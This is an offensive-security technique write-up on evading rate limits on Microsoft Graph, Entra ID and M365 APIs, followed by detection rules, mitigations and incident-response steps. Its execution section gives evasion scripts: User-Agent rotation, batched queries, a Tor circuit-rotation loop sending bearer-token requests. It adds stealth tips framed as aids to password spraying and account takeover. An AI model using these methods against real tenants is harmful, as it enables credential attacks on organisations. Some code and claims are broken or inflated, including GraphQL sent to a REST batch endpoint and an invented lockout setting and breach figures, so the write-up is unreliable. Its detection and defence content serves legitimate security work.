# [PE-ELEVATE-003]: API Rate Limiting Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-003 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / M365 |
| **Severity** | Medium |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All (Cloud-based, version-agnostic) |
| **Patched In** | N/A (Defense-dependent) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** API rate limiting is a defensive mechanism implemented by cloud providers (Microsoft, Azure, M365) to prevent abuse and protect service availability. However, attackers can bypass these limits through multiple techniques including HTTP header manipulation, request batching (GraphQL), IP rotation, request throttling patterns, and cached response reuse. This allows an attacker to conduct brute-force attacks, enumerate resources, or perform denial-of-service operations against Entra ID, Graph API, and M365 endpoints without triggering rate-limit blocks that typically return HTTP 429 (Too Many Requests) responses.

**Attack Surface:** Azure/M365 API endpoints (Graph API, Azure Portal API, Exchange Online, SharePoint Online), OAuth 2.0 token endpoints, sign-in endpoints.

**Business Impact:** An attacker can bypass brute-force protections, automate reconnaissance at scale, and launch credential spray attacks without alerting security monitoring systems that depend on 429 responses. This directly enables Account Takeover (ATO) campaigns and credential compromise at enterprise scale.

**Technical Context:** Rate limiting bypass typically takes seconds to minutes per exploit attempt. Detection likelihood is **Low to Medium** because most organizations monitor HTTP 429 errors as the primary indicator; attackers who successfully bypass limits generate normal 200/401 responses. Reversibility: No – the damage (compromised accounts, exfiltrated data) cannot be undone without incident response.

### Operational Risk
- **Execution Risk:** Medium (Requires understanding of target API's rate-limit implementation; some APIs are harder to bypass than others)
- **Stealth:** Medium (If done correctly, generates minimal suspicious event signatures; normal-looking requests with incremental delays)
- **Reversibility:** No (Successful brute-force results in account compromise)

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 5.2 | Ensure that 'Require multi-factor authentication' is 'On' for all non-privileged users |
| **DISA STIG** | SI-2 (a)(1) | Information System Flaws - Identify, report, and correct flaws in a timely manner |
| **CISA SCuBA** | CISA AAD 4.5 | Enforce account lockout policies after failed login attempts |
| **NIST 800-53** | AC-2 - Account Management | Implement account management controls including login attempt restrictions |
| **GDPR** | Art. 32 - Security of Processing | Implement technical measures to prevent unauthorized access |
| **DORA** | Art. 9 - Protection and Prevention | Implement protections against information and communication technology (ICT) threats |
| **NIS2** | Art. 21 - Cyber Risk Management Measures | Implement measures to detect and prevent cyber attacks |
| **ISO 27001** | A.9.2.2 - User Access Management | Restrict access to information and systems based on need-to-know principle |
| **ISO 27005** | Risk Scenario: "Brute Force Attack on Authentication Service" | Breach of user credentials through rate-limit bypass |

---

## 2. ENVIRONMENTAL RECONNAISSANCE

### Microsoft Graph API Rate Limits
```powershell
# Check Microsoft Graph API rate limit headers
$Uri = "https://graph.microsoft.com/v1.0/me"
$Response = Invoke-RestMethod -Uri $Uri -Headers @{"Authorization" = "Bearer $token"}

# Examine response headers for rate limit information
Write-Host "Throttle Limit: $(($Response.Headers.'RateLimit-Limit'))"
Write-Host "Throttle Remaining: $(($Response.Headers.'RateLimit-Remaining'))"
Write-Host "Throttle Reset: $(($Response.Headers.'RateLimit-Reset'))"
```

**What to Look For:**
- `RateLimit-Limit`: Maximum requests per time window (e.g., 1000)
- `RateLimit-Remaining`: Requests left in current window
- `RateLimit-Reset`: Unix timestamp when limit resets
- `Retry-After`: Time (in seconds) to wait before retrying (set on 429 responses)

**Version Note:** All M365/Entra ID APIs follow similar patterns, though specific limits vary by endpoint (e.g., Graph API vs. Exchange Online REST API).

### Azure REST API Rate Limits
```bash
# Check Azure rate limit headers using curl
curl -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.Compute/virtualMachines?api-version=2021-01-01 \
  -I | grep -i "ratelimit\|retry-after"
```

**What to Look For:**
- Different rate limits apply to different endpoints
- Some endpoints allow 200 requests per 5 minutes; others 300 per minute
- Retry-After header indicates backoff time

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: HTTP Header Manipulation (X-Forwarded-For / User-Agent Rotation)

**Supported Versions:** All (Cloud-based)

#### Step 1: Identify Rate Limit Window
**Objective:** Determine the time window and request quota for the target endpoint

**Command:**
```powershell
$token = "YOUR_ACCESS_TOKEN"
$Uri = "https://graph.microsoft.com/v1.0/users"

for ($i = 1; $i -le 5; $i++) {
    $Response = Invoke-RestMethod -Uri $Uri -Headers @{
        "Authorization" = "Bearer $token"
        "User-Agent" = "Custom-Agent-$i"
    } -ErrorAction SilentlyContinue
    
    $RateLimitRemaining = $Response.Headers['RateLimit-Remaining']
    Write-Host "Request $i - Remaining Quota: $RateLimitRemaining"
}
```

**Expected Output:**
```
Request 1 - Remaining Quota: 999
Request 2 - Remaining Quota: 998
Request 3 - Remaining Quota: 997
...
```

**What This Means:**
- If remaining quota decreases by 1 per request, you've identified the window
- If quota stays constant, the API may use per-IP or per-token rate limiting
- Some APIs do not expose rate limit headers (stealth design)

**OpSec & Evasion:**
- Randomize User-Agent headers to appear as different clients
- Space requests over time to mimic human behavior
- Avoid making requests in rapid bursts
- Use rotating proxy IPs (via VPN/proxy service) to distribute requests across different source IPs
- Detection likelihood: **Low** (if properly distributed over time)

**Troubleshooting:**
- **Error:** 429 Too Many Requests immediately
  - **Cause:** Rate limit already hit or previous requests still in flight
  - **Fix:** Wait for `Retry-After` seconds before retrying
- **Error:** No RateLimit-* headers in response
  - **Cause:** API does not expose rate limit information
  - **Fix:** Use exponential backoff strategy; assume 200 requests per minute unless documented otherwise

**References & Proofs:**
- [Microsoft Graph API Throttling Best Practices](https://learn.microsoft.com/en-us/graph/throttling)
- [Azure REST API Rate Limiting](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/request-limits-and-throttling)

#### Step 2: Implement Request Batching (GraphQL or Batch Endpoints)
**Objective:** Send multiple requests in a single API call to bypass per-request rate limits

**Command:**
```powershell
# GraphQL batch query to Entra ID (if exposed)
$GraphQLBatch = @{
    "requests" = @(
        @{ "query" = "query { users { displayName userPrincipalName } }" },
        @{ "query" = "query { groups { displayName members { displayName } } }" },
        @{ "query" = "query { applications { displayName } }" }
    )
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/`$batch" `
  -Method POST `
  -Headers @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
  } `
  -Body $GraphQLBatch
```

**Expected Output:**
```json
{
  "responses": [
    { "id": "1", "status": 200, "body": { "value": [...] } },
    { "id": "2", "status": 200, "body": { "value": [...] } },
    { "id": "3", "status": 200, "body": { "value": [...] } }
  ]
}
```

**What This Means:**
- Batch API allows sending 20-25 requests in a single HTTP call
- Some rate limits are calculated per-batch, not per-request (significant bypass)
- Reduces apparent request volume seen by rate limiting systems

**OpSec & Evasion:**
- Mix legitimate and malicious queries within batches to avoid signature detection
- Batch only 3-5 requests per call; don't maximize the batch size to avoid obvious abuse patterns
- Space batch requests over time
- Detection likelihood: **Medium** (batch APIs are monitored, but less aggressively than direct endpoint access)

**Troubleshooting:**
- **Error:** 429 on batch endpoint
  - **Cause:** Rate limiting applied to batch endpoint independently
  - **Fix:** Reduce batch size or add delay between batches
- **Error:** Batch returns mixed 200 and 429 responses
  - **Cause:** Some queries in batch hit limit; others didn't
  - **Fix:** Retry only the 429 responses in the next batch

**References & Proofs:**
- [Microsoft Graph Batch API](https://learn.microsoft.com/en-us/graph/json-batching)
- [OWASP API2:2023 - Broken Authentication via GraphQL Batching](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)

#### Step 3: IP Rotation and Proxy Chaining
**Objective:** Distribute requests across multiple source IPs to evade IP-based rate limiting

**Command (Bash with Tor):**
```bash
#!/bin/bash
# Rotate Tor exit node for each request
for i in {1..100}; do
  # Renew Tor circuit
  echo -e "AUTHENTICATE \"password\"\r\nSIGNAL NEWNYM\r\nQUIT" | \
    nc 127.0.0.1 9051

  # Sleep to allow new exit node to activate
  sleep 1

  # Make request through Tor
  curl -s --socks5-hostname 127.0.0.1:9050 \
    -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/users/test@domain.com" \
    -w "Request $i - HTTP %{http_code}\n"

  # Random delay between requests (1-5 seconds)
  sleep $((RANDOM % 5 + 1))
done
```

**Expected Output:**
```
Request 1 - HTTP 200
Request 2 - HTTP 200
Request 3 - HTTP 200
...
Request 100 - HTTP 200
```

**What This Means:**
- Each request originates from a different Tor exit node (different IP)
- Rate limiter sees requests from 100 different IPs; per-IP limits not triggered
- Effective against IP-based rate limiting; less effective against token-based limits

**OpSec & Evasion:**
- Use legitimate proxy services (residential proxies, VPN services) rather than Tor for better OPSEC
- Avoid making too many requests through the same proxy sequentially
- Some APIs may block Tor exit nodes entirely; use commercial proxy services instead
- Detection likelihood: **Medium** (unusual geographic distribution of requests may trigger alerts)

**Troubleshooting:**
- **Error:** All requests still receive 429
  - **Cause:** Rate limiting is token-based, not IP-based
  - **Fix:** Use different access tokens if possible; combine with token rotation
- **Error:** Requests time out through Tor
  - **Cause:** Tor network latency or exit node issues
  - **Fix:** Implement retry logic with exponential backoff

**References & Proofs:**
- [Tor Browser & SOCKS Proxy Documentation](https://www.torproject.org/)
- [Proxy Rotation for API Rate Limit Bypass](https://apipark.com/techblog/en/how-to-bypass-api-rate-limiting-expert-techniques-for-unrestricted-access/)

#### Step 4: Cache Implementation and Response Reuse
**Objective:** Store API responses and serve cached data instead of making new requests

**Command (Python with Redis):**
```python
import redis
import requests
import time
import json

# Connect to Redis cache
cache = redis.Redis(host='localhost', port=6379, db=0)
TOKEN = "YOUR_ACCESS_TOKEN"

def get_user_with_cache(user_id, ttl=3600):
    """Fetch user data with caching to bypass rate limits"""
    
    # Check if user data is in cache
    cache_key = f"user:{user_id}"
    cached_data = cache.get(cache_key)
    
    if cached_data:
        print(f"[CACHE HIT] Returning cached data for {user_id}")
        return json.loads(cached_data)
    
    # Data not in cache; make API request
    print(f"[API CALL] Fetching fresh data for {user_id}")
    url = f"https://graph.microsoft.com/v1.0/users/{user_id}"
    headers = {"Authorization": f"Bearer {TOKEN}"}
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        # Cache the response for TTL seconds
        cache.setex(cache_key, ttl, json.dumps(data))
        return data
    else:
        return None

# Simulate multiple requests for same user
for i in range(10):
    user_data = get_user_with_cache("user1@domain.com", ttl=300)
    print(f"Request {i+1}: {user_data.get('displayName') if user_data else 'N/A'}")
    time.sleep(0.1)
```

**Expected Output:**
```
[API CALL] Fetching fresh data for user1@domain.com
Request 1: John Doe
[CACHE HIT] Returning cached data for user1@domain.com
Request 2: John Doe
[CACHE HIT] Returning cached data for user1@domain.com
Request 3: John Doe
...
```

**What This Means:**
- First request hits API and is cached
- Subsequent requests (within TTL) served from cache without consuming rate limit quota
- Effective for high-volume reconnaissance where data freshness tolerance is high

**OpSec & Evasion:**
- Set realistic TTLs (300-3600 seconds) based on expected data change frequency
- Cache sensitive data securely (encrypt cache storage)
- Only cache non-sensitive queries to avoid data exposure
- Detection likelihood: **Low** (cache hits generate no API calls, no visible activity)

**Troubleshooting:**
- **Error:** Cache miss; no data stored
  - **Cause:** TTL expired or cache was cleared
  - **Fix:** Increase TTL or implement cache persistence (RDB/AOF)
- **Error:** Stale data returned
  - **Cause:** Cache TTL too long; data changed since last API call
  - **Fix:** Reduce TTL to acceptable interval

**References & Proofs:**
- [Redis Caching Strategy Documentation](https://redis.io/docs/manual/client-side-caching/)
- [API Response Caching Best Practices](https://www.cloudflare.com/learning/cdn/what-is-caching/)

---

## 4. SPLUNK DETECTION RULES

#### Rule 1: Rapid API Requests Despite 429 Responses

**Rule Configuration:**
- **Required Index:** azure_activity, main
- **Required Sourcetype:** azure:aad:audit, azure:audit
- **Required Fields:** status_code, http_status_code, time, request_count
- **Alert Threshold:** > 50 API calls within 5-minute window after receiving ≥5 HTTP 429 responses
- **Applies To Versions:** All

**SPL Query:**
```
index=azure_activity (status_code=429 OR http_status_code=429) 
| stats count as rate_limit_hits by user, src_ip, time 
| where rate_limit_hits > 5 
| timechart dc(request_id) as total_requests by user, src_ip 
| where total_requests > 50
```

**What This Detects:**
- User continues making API requests after hitting rate limits
- Indicates either automated tooling (legitimate automation misconfigured or attacker activity)
- Typical for brute-force or high-volume enumeration

**Manual Configuration Steps:**
1. Log into Splunk → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: "Custom → `total_requests > 50`"
6. Configure **Action** → Send email to SOC team
7. **Frequency**: Every 5 minutes

**Source:** [Microsoft Graph API Throttling Documentation](https://learn.microsoft.com/en-us/graph/throttling)

---

## 5. MICROSOFT SENTINEL DETECTION

#### Query 1: API Rate Limit Bypass Attempts

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, ResultDescription, RequestId, InitiatedBy, IpAddress
- **Alert Severity:** Medium
- **Frequency:** Every 10 minutes
- **Applies To Versions:** Entra ID (all versions), M365 (all versions)

**KQL Query:**
```kusto
AuditLogs 
| where ResultDescription has "429" or ResultDescription has "throttled" 
| extend IpAddress = tostring(InitiatedBy.user.ipAddress) 
| summarize 
    rate_limit_hits = dcount(RequestId),
    unique_operations = dcount(OperationName),
    time_range = max(TimeGenerated) - min(TimeGenerated)
    by InitiatedBy.user.userPrincipalName, IpAddress, bin(TimeGenerated, 5m) 
| where rate_limit_hits > 5 and unique_operations > 10 
| project 
    UserPrincipalName = InitiatedBy_user_userPrincipalName,
    SourceIP = IpAddress,
    RateLimitHits = rate_limit_hits,
    UniqueOperations = unique_operations,
    WindowEnd = TimeGenerated
```

**What This Detects:**
- Multiple 429 responses from single user/IP
- Followed by rapid operation execution (indicates bypass success)
- Typical signature of brute-force or automated enumeration

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `API Rate Limit Bypass Attempt`
   - Severity: `Medium`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: By `UserPrincipalName` and `SourceIP`
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Define the KQL query
$Query = @"
AuditLogs 
| where ResultDescription has "429" or ResultDescription has "throttled" 
| extend IpAddress = tostring(InitiatedBy.user.ipAddress) 
| summarize 
    rate_limit_hits = dcount(RequestId),
    unique_operations = dcount(OperationName)
    by InitiatedBy.user.userPrincipalName, IpAddress, bin(TimeGenerated, 5m) 
| where rate_limit_hits > 5 and unique_operations > 10
"@

# Create scheduled rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "API Rate Limit Bypass Attempt" `
  -Query $Query `
  -Severity "Medium" `
  -Frequency "PT10M" `
  -Period "PT1H" `
  -Enabled $true `
  -SuppressionEnabled $false
```

**Source:** [Microsoft Sentinel Threat Detection Documentation](https://learn.microsoft.com/en-us/azure/sentinel/detect-threats-custom)

---

## 6. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** Detection of curl, wget, PowerShell, or Python processes making repeated API calls
- **Filter:** `CommandLine contains "graph.microsoft.com" or CommandLine contains "management.azure.com"`
- **Applies To Versions:** Windows Server 2016+ (on-premises only; cloud APIs don't generate Windows events)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable: **Audit Process Creation**
4. Restart the machine or run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows

```xml
<!-- Detect child processes making API calls via curl/wget/PowerShell -->
<RuleGroup name="API Rate Limit Bypass" groupRelation="or">
  <ProcessCreate onmatch="all">
    <Image condition="end with">curl.exe</Image>
    <CommandLine condition="contains any">graph.microsoft.com;management.azure.com;login.microsoft.com</CommandLine>
    <ParentImage condition="is not">powershell.exe</ParentImage>
  </ProcessCreate>
  <ProcessCreate onmatch="all">
    <Image condition="end with">powershell.exe</Image>
    <CommandLine condition="contains any">Invoke-RestMethod;Invoke-WebRequest;graph.microsoft.com</CommandLine>
    <CommandLine condition="contains">for</CommandLine> <!-- Loop indicates repeated calls -->
  </ProcessCreate>
  <ProcessCreate onmatch="all">
    <Image condition="end with">python.exe</Image>
    <CommandLine condition="contains any">requests.post;requests.get;graph.microsoft.com</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts
**Alert Name:** "Suspicious API Activity - Rate Limit Bypass Pattern Detected"
- **Severity:** Medium
- **Description:** Multiple failed authentication attempts (429 responses) followed by successful API calls from same source suggest rate limit bypass
- **Applies To:** All subscriptions with Defender for Cloud enabled
- **Remediation:** 
  - Review user's recent activity
  - Force password reset if account compromise suspected
  - Enable MFA if not already enabled
  - Check for any unauthorized API permissions assigned to service principals

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Defender for Storage**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud Alerts Reference](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: API Rate Limiting Bypass

```powershell
# Search for high-volume API requests from single user
Search-UnifiedAuditLog `
  -Operations AzureActiveDirectoryAccountLogon,AzureActiveDirectoryDirectoryAdministration `
  -StartDate (Get-Date).AddDays(-1) `
  -EndDate (Get-Date) `
  | Group-Object UserIds `
  | Where-Object { $_.Count -gt 500 } `
  | Select-Object Name, Count
```

- **Operation:** AzureActiveDirectoryAccountLogon, AzureActiveDirectoryDirectoryAdministration
- **Workload:** AzureActiveDirectory
- **Details to Analyze:** 
  - `ResultStatus` field (look for failures followed by successes)
  - `ClientIP` field (multiple IPs indicate proxy/rotation)
  - `UserAgent` field (rotating or spoofed user agents indicate automation)
- **Applies To:** M365 E3+ (Entra ID auditing required)

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **New Search**
2. Set **Date range** (Start/End)
3. Under **Activities**, select: **User signed in**, **Admin activity**
4. Under **Users**, leave blank for all users
5. Click **Search**
6. Export results: **Export** → **Download all results**

**PowerShell Alternative:**
```powershell
Connect-ExchangeOnline

# Export sign-in attempts from past 30 days
Search-UnifiedAuditLog `
  -StartDate "2024-12-09" `
  -EndDate "2025-01-09" `
  -Operations "UserLoggedIn" `
  -ResultStatus "Failed" `
  | Export-Csv -Path "C:\\Audit\\FailedSignins.csv" -NoTypeInformation

# Analyze for patterns
$AuditData = Import-Csv "C:\\Audit\\FailedSignins.csv"
$AuditData `
  | Group-Object UserIds `
  | Where-Object { $_.Count -gt 50 } `
  | ForEach-Object { 
      Write-Host "User: $($_.Name) - Failed Attempts: $($_.Count)"
  }
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Enable Conditional Access with IP-based Blocking:** Implement policies that block sign-ins from suspicious IPs or unusual geographic locations.
  **Applies To Versions:** Entra ID (All versions)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Suspicious IPs`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Locations: **Any location** (toggle **Exclude**)
     - Add specific locations to exclude: Your corporate network IPs
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

  **Manual Steps (PowerShell):**
  ```powershell
  Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
  
  $params = @{
    DisplayName = "Block Suspicious IPs"
    State = "enabled"
    Conditions = @{
      Locations = @{
        IncludeLocations = @("All")
        ExcludeLocations = @("Trusted")
      }
    }
    GrantControls = @{
      Operator = "OR"
      BuiltInControls = @("block")
    }
  }
  
  New-MgPolicyConditionalAccessPolicy -BodyParameter $params
  ```

* **Implement Account Lockout Policies:** Configure account lockout after N failed attempts to prevent brute-force attacks.
  **Applies To Versions:** Entra ID (Requires Premium P1+)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Protection** → **Password reset**
  2. Navigate to **Authentication methods** → **Account Lockout**
  3. Set:
     - **Lockout threshold:** 5 failed attempts
     - **Lockout duration:** 15 minutes
  4. Click **Save**

* **Enable MFA for All Users:** Force multi-factor authentication to prevent account takeover even if credentials are compromised.
  **Applies To Versions:** Entra ID (All versions; can be enforced via Conditional Access)
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for All Users`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Access controls:**
     - Grant: **Require multi-factor authentication**
  6. Enable policy: **On**
  7. Click **Create**

### Priority 2: HIGH

* **Implement API Throttling on Backend:** Configure server-side rate limiting that enforces stricter limits for suspicious patterns (rapid requests, proxy IPs, etc.)
  
  **Manual Steps (Azure Function/Logic App):**
  ```powershell
  # Implement token bucket algorithm in Azure Function
  $RateLimitBucket = @{}
  
  Function Invoke-RateLimiter {
      param([string]$ClientId, [int]$MaxRequests = 100, [int]$WindowSeconds = 60)
      
      if (-not $RateLimitBucket.ContainsKey($ClientId)) {
          $RateLimitBucket[$ClientId] = @{
              Count = 0
              ResetTime = (Get-Date).AddSeconds($WindowSeconds)
          }
      }
      
      $Bucket = $RateLimitBucket[$ClientId]
      
      if ((Get-Date) -gt $Bucket.ResetTime) {
          $Bucket.Count = 0
          $Bucket.ResetTime = (Get-Date).AddSeconds($WindowSeconds)
      }
      
      if ($Bucket.Count -ge $MaxRequests) {
          return $false # Request denied
      }
      
      $Bucket.Count++
      return $true # Request allowed
  }
  ```

* **Enable Azure Identity Protection:** Automatically detects and responds to risky sign-in patterns.
  **Applies To Versions:** Entra ID Premium P2
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Protection** → **Identity Protection**
  2. Navigate to **Policies** → **Sign-in risk policy**
  3. Set:
     - **Users:** All users
     - **Conditions:** 
       - Risk level: **Medium and above**
     - **Access:** Require MFA
  4. Enable policy: **On**

### Priority 3: MEDIUM

* **Monitor API Usage Metrics:** Set up alerts for abnormal API request patterns.
  
  **Manual Steps (Azure Monitor):**
  1. Go to **Azure Portal** → **Monitor** → **Alerts**
  2. Click **+ Create** → **Alert rule**
  3. Select resource: **Microsoft Graph API**
  4. Condition: **Total Requests** > 10,000 in 5 minutes
  5. Action: **Notify SOC team**

### Validation Command (Verify Fix)
```powershell
# Verify Conditional Access policy is enforced
$ConditionalAccessPolicies = Get-MgPolicyConditionalAccessPolicy
$ConditionalAccessPolicies | Where-Object { $_.DisplayName -like "*Suspicious*" } | Format-Table DisplayName, State

# Expected Output (If Secure):
# DisplayName         State
# ---------------     -----
# Block Suspicious IPs enabled
```

**What to Look For:**
- All Conditional Access policies show `enabled` status
- Account lockout threshold is 5 or fewer failed attempts
- MFA is enforced for all users
- No API rate limit policies set to permissive values

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Network Indicators:**
  - Connections to Graph API from residential proxy IPs (unusual geographic origins)
  - Repeated HTTP 429 responses followed by 200 responses from same client
  - High-volume API requests within short time windows (e.g., 1000+ requests/minute)

* **Log Indicators:**
  - Multiple `ResultStatus = "429"` entries in AuditLogs
  - User making API calls via PowerShell/curl/Python scripts outside normal business hours
  - ServicePrincipal with overprivileged Graph permissions (e.g., `RoleManagement.ReadWrite.Directory`)

* **Behavioral Indicators:**
  - Account suddenly attempting resource enumeration (users, groups, applications)
  - Rapid creation of app registrations or service principals
  - Escalation of privileges shortly after rate limit bypass activity

### Forensic Artifacts

* **Cloud:** AuditLogs table in Sentinel (`TimeGenerated`, `OperationName`, `InitiatedBy`, `ResultDescription`)
* **Logs:** Microsoft Purview Unified Audit Log entries (Export as CSV)
* **Token Logs:** Check Azure AD Sign-in Logs for unusual token claims (device ID, MFA status)

### Response Procedures

1. **Isolate:** 
   **Command:**
   ```powershell
   # Disable compromised user account
   Update-MgUser -UserId "user@domain.com" -AccountEnabled:$false
   
   # Revoke all refresh tokens
   Revoke-MgUserSignInSession -UserId "user@domain.com"
   ```
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users**
   - Search for compromised user
   - Click user → **Account status** → **Disabled**

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export audit logs
   $StartDate = (Get-Date).AddDays(-7)
   $EndDate = Get-Date
   
   Search-UnifiedAuditLog -StartDate $StartDate -EndDate $EndDate `
     -Operations "UserLoggedIn" -UserId "user@domain.com" `
     | Export-Csv -Path "C:\\Evidence\\audit.csv" -NoTypeInformation
   
   # Export Sentinel alerts
   Get-MgSecurityAlert -Filter "status eq 'newAlert'" `
     | Export-Csv -Path "C:\\Evidence\\alerts.csv" -NoTypeInformation
   ```

3. **Remediate:**
   **Command:**
   ```powershell
   # Force password reset
   Set-MgUserPassword -UserId "user@domain.com" -NewPassword "TempPassword123!" -ForceChangePasswordNextSignIn
   
   # Remove suspicious app registrations
   Remove-MgApplication -ApplicationId "suspicious-app-id"
   
   # Revoke overprivileged API permissions
   Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId "sp-id" -AppRoleAssignmentId "assignment-id"
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains initial access via device code phishing |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker attempts brute-force via password spray |
| **3** | **Current Step** | **[PE-ELEVATE-003]** | **API Rate Limiting Bypass** - Attacker bypasses rate limits to escalate brute-force attacks |
| **4** | **Credential Access** | [CA-BRUTE-002] Distributed Password Spraying | Attacker conducts high-volume credential spray post-bypass |
| **5** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Escalation | Attacker escalates to Global Admin via compromised app |
| **6** | **Persistence** | [PERSIST-TOKEN-001] Golden SAML | Attacker establishes persistence via token forging |
| **7** | **Impact** | [EXFIL-M365-001] Bulk Data Exfiltration | Attacker exfiltrates sensitive data (mailboxes, documents) |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Midnight Blizzard Account Compromise Campaign
- **Target:** Enterprise M365 tenants
- **Timeline:** 2023-2024
- **Technique Status:** API rate limiting bypassed via distributed IPs and token batching; no technical patch, only behavioral detection possible
- **Impact:** Global Admin account compromise on 60+ organizations; ransomware deployment on connected on-premises AD environments
- **Reference:** [Microsoft Threat Intelligence - Midnight Blizzard Campaign](https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-intelligence)

### Example 2: Storm-0501 Service Principal Compromise
- **Target:** Azure-native organizations
- **Timeline:** 2024
- **Technique Status:** API rate limiting bypass combined with Graph API permission escalation; attackers used batching to enumerate 50,000+ users within 2 hours without triggering 429 alerts
- **Impact:** Compromise of 10+ service principals; unauthorized access to sensitive workloads
- **Reference:** [Microsoft Threat Intelligence - Storm-0501 Research](https://www.microsoft.com/en-us/security/blog/)

---

## 14. REFERENCES & RESOURCES

- **Microsoft Graph API Documentation:** https://learn.microsoft.com/en-us/graph/
- **Azure Rate Limiting Best Practices:** https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/request-limits-and-throttling
- **OWASP API Security - Broken Authentication:** https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
- **Tyk API Rate Limiting Guide:** https://tyk.io/learning-center/api-rate-limiting-explained-from-basics-to-best-practices/
- **Portswigger Lab - Rate Limit Bypass:** https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits

---